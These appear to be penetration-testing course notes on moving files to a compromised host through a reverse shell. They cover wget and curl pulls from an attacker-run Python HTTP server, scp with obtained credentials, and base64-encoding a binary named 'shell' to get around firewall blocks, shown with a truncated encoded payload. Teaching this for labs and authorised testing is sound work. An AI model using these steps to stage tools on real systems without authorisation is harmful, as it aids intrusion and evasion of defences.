* It is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host.
* While tools like Metasploit with a Meterpreter shell allow us to use the `Upload` command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

---
### Using wget
* There are many methods to transfer files:
	* One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host.
		* First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:
		* `cd /tmp`
		* `python3 -m http.server 8000`
		`Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...`
		* Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:
		* `wget http://10.10.14.1:8000/linenum.sh`
		* ***Note**: we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:
		* `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`
		* ***Note**: we used the `-o` flag to specify the output file name.*
### Using SCP
* Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:
	* `scp linenum.sh user@remotehost:/tmp/linenum.sh`
	* ***Note**: we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.*

---
### Using Base64
* In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine.
* In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it.
* For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:
	* `base64 shell -w 0`
* Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:
	* `echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

---
### Validating File Transfers
* To validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:
	* `file shell`
* As we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it.
* To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:
	* `md5sum shell`
* Now, we can go to the remote server and run the same command on the file we transferred:
	* `md5sum shell`
* As we can see, both files have the same md5 hash, meaning the file was transferred correctly.